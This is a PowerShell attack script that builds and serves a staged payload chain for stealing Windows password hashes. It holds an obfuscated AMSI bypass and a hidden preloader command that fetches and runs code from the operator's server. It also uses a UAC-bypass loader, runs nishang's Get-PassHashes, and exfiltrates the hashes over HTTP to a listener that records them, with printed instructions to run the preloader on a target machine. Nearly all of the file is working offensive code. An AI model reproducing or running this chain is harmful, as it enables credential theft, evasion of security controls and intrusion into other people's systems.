function New-Payloads {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		[string]
		$ServerAddress,
		[Parameter(Mandatory = $false, Position = 1)]
		[ValidateNotNullOrEmpty()]
		[string]
		$ServerPort
	)
    
	Import-Module (Resolve-Path ".\B64-Util\B64-Util.ps1")

    $AmsiBypass = '[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))).GetField([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static").SetValue($null,$true)'

	$Preloader = "powershell -w h -c {IEX(wget 'http://$ServerAddress"+":$ServerPort/loader')}"

    $Loader = Get-Content (Resolve-Path ".\Easy-UAC\Easy-UAC.ps1") | Out-String
	$Loader += ";Easy-UAC -Hidden -Command " + '"' + "IEX(Invoke-WebRequest 'http://$ServerAddress"+":$ServerPort/payload')" + '"'
	$Loader = $Loader | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII

	$Payload = "$AmsiBypass;"
	$Payload += Get-Content (Resolve-Path ".\nishang\Gather\Get-PassHashes.ps1") |
	Out-String |
	Convert-StringToB64 -Compress -Encoding ASCII |
	Package-CompressedB64 -Encoding ASCII
	$Payload += ";Invoke-WebRequest ('http://$ServerAddress"+":$ServerPort/data?data='+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((Get-PassHashes | Out-String))));[GC]::Collect()"
	$Payload = $Payload | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII

	return [PSCustomObject]@{Preloader=$Preloader;Loader=$Loader;Payload=$Payload}
}

function Start-TelemetryServer {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		$Payloads,
		[Parameter(Mandatory = $false, Position = 1)]
		[ValidateNotNullOrEmpty()]
		[Int]
		$ServerPort = 9000
	)

	if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        Write-Error -Message "Please start as Administrator" -Exception PermissionError
        Exit;
    }

	$Listener = New-Object Net.HttpListener
	$Listener.Prefixes.Add("http://+:$ServerPort/")
	$Listener.Start()

	$RecievedData = $null
	while (!$RecievedData) {
		$Context = $Listener.GetContext()
		$Response = $Context.Response
		$ResponseData = $null

		switch ($Context.Request.Url.ToString().Split("/")[3].Split("?")[0]) {
			"loader" { $ResponseData = [Text.Encoding]::UTF8.GetBytes($Payloads.Loader) }
			"payload" { $ResponseData = [Text.Encoding]::UTF8.GetBytes($Payloads.Payload) }
			"data" { $ResponseData = [Text.Encoding]::UTF8.GetBytes(" ")
					 if ([bool]($Context.Request.QueryString.Keys.ForEach({$_.Equals("data")}))) {$RecievedData = $Context.Request.QueryString.Get("data")} }
			Default { $ResponseData = [Text.Encoding]::UTF8.GetBytes(" ") }
		}
		
		$Response.Headers.Add("Content-Type","text/plain")
		$Response.ContentLength64 = $ResponseData.Length
        $Response.OutputStream.Write($ResponseData, 0, $ResponseData.Length)
        $Response.OutputStream.Close()
	}

	$Listener.Close()
	[GC]::Collect()

	return [PSCustomObject]@{Origin=$Context.Request.RemoteEndPoint.Address;Data=$RecievedData}
}

function Start-HashAcquisition {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		[string]
		$ServerAddress,
		[Parameter(Mandatory = $false, Position = 1)]
		[ValidateNotNullOrEmpty()]
		[switch]
		$SaveToFile,
		[Parameter(Mandatory = $false, Position = 1)]
		[ValidateNotNullOrEmpty()]
		[Int]
		$ServerPort = 9000
	)

	Clear-Host

	if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        Write-Error -Message "Please start as Administrator" -Exception PermissionError
        return;
    }

	$Payloads = New-Payloads -ServerAddress $ServerAddress -ServerPort $ServerPort

	Write-Host
	Write-Host "Execute the following on a target machine:"
	Write-Host $Payloads.Preloader
	Write-Host

	Write-Host
	Write-Host "Starting telemetry server on port $ServerPort..."
	Write-Host
	Write-Host

	$Data = Start-TelemetryServer -Payloads $Payloads -ServerPort $ServerPort
	$HashInfo = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($Data.Data))
	$TargetAddress = $Data.Origin

	Write-Host
	Write-Host ("Recieved the following data from $TargetAddress" + ":")
	Write-Host
	Write-Host $HashInfo

	if ($SaveToFile) {
		Write-Host
		Write-Host "Saving to Hashes.txt"

		if (!(Test-Path -Path ".\Hashes.txt")) {
			New-Item -ItemType File -Force -Path (Join-Path -Path (Resolve-Path ".\") "Hashes.txt")
		}

		$HashInfo | Out-File -FilePath (Resolve-Path "Hashes.txt") -Append | Out-Null
	}


	$Host.UI.RawUI.ReadKey() | Out-Null

}